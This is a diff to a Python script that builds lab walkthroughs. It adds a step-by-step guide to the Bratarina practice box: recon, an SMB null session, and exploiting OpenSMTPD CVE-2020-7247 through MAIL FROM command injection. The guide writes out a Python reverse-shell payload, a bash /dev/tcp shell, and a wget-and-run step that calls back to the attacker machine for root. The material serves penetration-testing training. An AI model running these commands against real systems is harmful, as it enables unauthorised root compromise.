@@ -118,8 +118,61 @@ nibbles = {
     '📂 Run `find / -perm -u=s` and check every unusual binary on **GTFOBins**.'],
 }
 
+bratarina = {
+  'title': 'Linux · OpenSMTPD RCE → direct root',
+  'lab': {'name': 'Bratarina', 'platform': 'PG Practice', 'os': 'Linux'},   # not on TJ Null's list
+  'ips': {'K': '192.168.45.180', 'T': '192.168.153.71'},
+  'steps': [
+    {'h': 'Recon', 'b': [
+      P('There is only **one flag** on this box: `proof.txt`.'),
+      C('sudo nmap -p- --min-rate 5000 -Pn {T} -oN brat_ports.txt\nsudo nmap -sC -sV -p 22,25,53,80,445 -Pn {T} -oN brat_svc.txt'),
+      O('22/tcp  open   ssh          OpenSSH 7.6p1 Ubuntu\n25/tcp  open   smtp         OpenSMTPD\n53/tcp  closed domain\n80/tcp  open   http         nginx 1.14.0  (FlaskBB)\n445/tcp open   netbios-ssn  Samba smbd 4.7.6-Ubuntu'),
+      P('🎯 The leads are **SMB (445)** and **OpenSMTPD (25)**.')]},
+    {'h': 'SMB null session', 'b': [
+      C('smbclient -N -L //{T}/'),
+      O('backups   Disk   Share for backups'),
+      C('smbclient -N //{T}/backups'),
+      P('Inside the smbclient prompt:'),
+      C('get passwd.bak\nexit', 'smb'),
+      C('cat passwd.bak'),
+      O('neil:x:1000:1000:neil,,,:/home/neil:/bin/bash'),
+      P('🐇 A rabbit hole: you get a username and nothing else. Move on to SMTP.')]},
+    {'h': 'SMTP banner and searchsploit', 'b': [
+      C('nc -nv {T} 25'),
+      O('220 bratarina ESMTP OpenSMTPD'),
+      C('searchsploit opensmtpd\nsearchsploit -m 47984'),
+      O('OpenSMTPD 6.6.1 - Remote Code Execution | linux/remote/47984.py'),
+      P('💥 **CVE-2020-7247**: commands are injected through the MAIL FROM field and run **as root**.')]},
+    {'h': 'Confirm the RCE', 'b': [
+      P('Terminal 1:'),
+      C('sudo tcpdump -i tun0 icmp'),
+      P('Terminal 2:'),
+      C("python3 47984.py {T} 25 'ping -c 2 {K}'"),
+      O('IP {T} > {K}: ICMP echo request'),
+      P('✅ RCE is confirmed.')]},
+    {'h': 'Reverse shell as root', 'b': [
+      C('rlwrap nc -lvnp 80'),
+      C('python3 47984.py {T} 25 \'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\"{K}\\",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\"/bin/sh\\",\\"-i\\"])"\''),
+      O('uid=0(root) gid=0(root) groups=0(root)'),
+      W('Egress is filtered, so call back on **port 80**.')]},
+    {'h': 'proof.txt', 'b': [
+      C("python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\ncat /root/proof.txt"),
+      F('proof.txt captured 👑')]},
+  ],
+  'backup': {'h': 'Backup route: host a script and fetch it', 'b': [
+    C("echo 'bash -i >& /dev/tcp/{K}/80 0>&1' > shell.sh\npython3 -m http.server 445"),
+    C("python3 47984.py {T} 25 'wget http://{K}:445/shell.sh -O /tmp/shell.sh'\npython3 47984.py {T} 25 'bash /tmp/shell.sh'")]},
+  'takeaways': [
+    '📡 **Grab the banner** of every service, then `searchsploit` it.',
+    '📂 Check SMB with a **null session** (`smbclient -N -L`).',
+    '🐇 Don\'t get stuck on rabbit holes like passwd.bak.',
+    '🏓 For blind RCE, confirm with `ping` and `tcpdump` first.',
+    '🌐 To get past the egress filter, call back on ports the box already uses (**80, 445**).',
+    '👑 A service running as root gives you root directly, with no privesc needed.'],
+}
+
 out = ('/* Step-by-step walkthroughs for labs, shown on the lab page.\n'
        '   Built by build_guides.py. {K} is your Kali IP and {T} the target IP. */\n'
-       'window.OSCP_GUIDES = ' + json.dumps({'pgp-jacko': jacko, 'pgp-nibbles': nibbles}, ensure_ascii=False, indent=1) + ';\n')
+       'window.OSCP_GUIDES = ' + json.dumps({'pgp-jacko': jacko, 'pgp-nibbles': nibbles, 'pgp-bratarina': bratarina}, ensure_ascii=False, indent=1) + ';\n')
 io.open(r'C:\Users\bhavi\Desktop\Personal_App\lib\oscp-guides.js', 'w', encoding='utf-8', newline='\n').write(out)
 print(len(out))
